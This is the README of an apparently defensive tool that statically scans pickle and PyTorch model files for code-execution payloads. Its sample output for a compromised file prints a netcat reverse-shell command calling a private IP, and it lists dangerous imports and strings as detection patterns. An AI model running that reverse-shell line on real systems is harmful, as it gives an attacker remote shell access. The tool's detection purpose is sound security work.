
# 🛡️ Safe Pickle Analysis Tool

A lightweight, zero-dependency security tool for performing **static safety analysis** on Pickle-based files (`.pkl`, `.pickle`, `.pt`). It detects suspicious patterns, malicious payloads, and dangerous imports *without* executing the potentially harmful code.

## ⚠️ Why is this necessary?
Deserializing untrusted data using Python's `pickle.load()` or PyTorch's `torch.load()` is highly dangerous. If a model file is compromised, loading it can lead to **Remote Code Execution (RCE)**. 

This tool mitigates that risk by using `pickletools.genops()` to safely disassemble and inspect the bytecode instructions (opcodes) **before** you actually deserialize the model data. 

## ✨ Features
- **Safe Inspection:** Analyzes files strictly via static analysis (no code execution).
- **Format Support:** Works with standard Python pickles (`.pkl`, `.pickle`) and PyTorch models (`.pt`, `.pth`).
- **Directory Scanning:** Recursively scans entire directories for ML models.
- **CI/CD Ready:** Returns non-zero exit codes on threat detection and supports `--json` output for automated pipelines.
- **Payload Detection:** Identifies dangerous imports (e.g., `os.system`, `subprocess`) and suspicious strings (e.g., `/bin/sh`, `/etc/passwd`).

## 🚀 Usage

You can run the script against a single file or an entire directory. 

**1. Analyze a single file:**
```
bash
python safe_analysis_pkl.py model.pkl
2. Scan an entire directory for ML models:
code
Bash
python safe_analysis_pkl.py /opt/supply-chain/models/
3. Output results in JSON (useful for integration & jq):
code
Bash
python safe_analysis_pkl.py model.pkl --json | jq .
📊 Example Output
Standard Output (Safe File):
code
Text
========================================
File: /models/clean_model.pkl
Size: 15.20 MB

Verdict: SAFE - No executable code detected
========================================
Standard Output (Compromised File):
code
Text
========================================
File: /models/hacked_model.pt
Size: 4.30 MB

[CRITICAL] Dangerous imports/opcodes found:
  - IMPORT/EXECUTE: os.system

[CRITICAL] Suspicious strings/payloads detected:
  - 'nc -e /bin/sh 10.0.0.1 4444'

Verdict: UNSAFE - Contains executable code targeting 'os.system'
========================================
```
## 🚩 Detection Logic (Red Flags)

| Pattern | Concern Level | Legitimate Use? |
| :--- | :--- | :--- |
| `os`, `subprocess`, `pty` | 🔴 Critical | Almost never in a model file |
| `system`, `popen`, `run` | 🔴 Critical | **Never** |
| `eval`, `exec` | 🔴 Critical | **Never** |
| `socket`, `requests` | 🔴 Critical | **Never** |
| `STACK_GLOBAL` | 🟡 Moderate | Common; check what it resolves |
| `REDUCE` | 🟡 Moderate | Common; check context |
